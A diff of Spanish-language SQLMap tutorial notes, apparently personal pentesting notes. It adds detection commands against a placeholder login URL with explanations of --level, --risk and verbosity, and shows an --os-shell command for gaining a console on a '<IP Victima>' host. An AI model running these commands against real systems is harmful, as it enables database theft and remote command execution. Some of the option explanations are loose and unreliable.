@@ -132,7 +132,37 @@ Al utilizar SQLMap, los profesionales de seguridad pueden identificar y corregir
 	# time-sec = Le damos un tiempo maximo de espera a la apliacion ya que estaremos usando la tecnica 'Time Based Blind' y asi SQLMap no crea que la app dejo de funcionar 
 ```
 
-## Primer Forma 
+## Detección 
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --level 1 -v 5
+
+	# level = Nivel de intensidad que van desde el 1 al 5 
+		# 1 = Testear parametros 'GET o POST'
+		# 2 = Explota vulnes en el 'User-Agent o Encabezado HTTP'
+		# 3 = Explotar vulnes en las 'Cookies'
+	# v = Verbosidad que van desde el 1 al 5
+		# 1 = Ahi podemos ver 'Info, Alertas, Mensajes, Preguntas'
+		# 5 = Toda la peticion que hace al servidor HTTP, ademas de sus datos y encabezados
+```
+
+```bash 
+❯ sqlmap -u "http://IP/index.php?page=user-info.php&username=omar&password=omar&login-php-submit-button=Login" --dbs --dbms MySQL --random-agent --risk 3 -v 5
+
+	# risk = Niveles de riesgo que van desde el 1 al 3
+		# 1 = Testea los puntos de inyeccion SQL como los parametros 'Username, Password, etc...'
+		# 2 = Hace inyeccciones de tiempo 
+		# 3 = Hace inyecciones como 'Error Base, OR, Union'
+```
+
+## Enumeración 
+
+```bash 
+
+```
+
+
+## Ejemplo 1
 
 ```bash 
 ❯ sqlmap -u 'http://site.com/index.php?id=1'    # Necesitamos pasarle la URL en donde se encuentra el index.php con el parametro 'id' existente. 
@@ -172,8 +202,7 @@ Cuando mires en una maquina victima el directorio **/.git/** quiere decir que se
 ❯ sqlmap -u 'http://<IP Victima>' --cookie "PHPSESSID=8w7uf5n4yn4q7896578yb" --os-shell --batch     # Si el servidor interpreta PHP, tenemos permisos, podriamos ganar una consola interactiva 
 ```
 
-
-## Segunda forma 
+## Ejemplo 2  
 
 Podemos usar los archivos de BurpSuite para ingresarlos en la herramienta SQLMap y así nos diga que tipo de vulnerabilidades tiene, además de poder obtener datos a partir de ellas. Para este ejemplo usaremos **SQLI**.
 
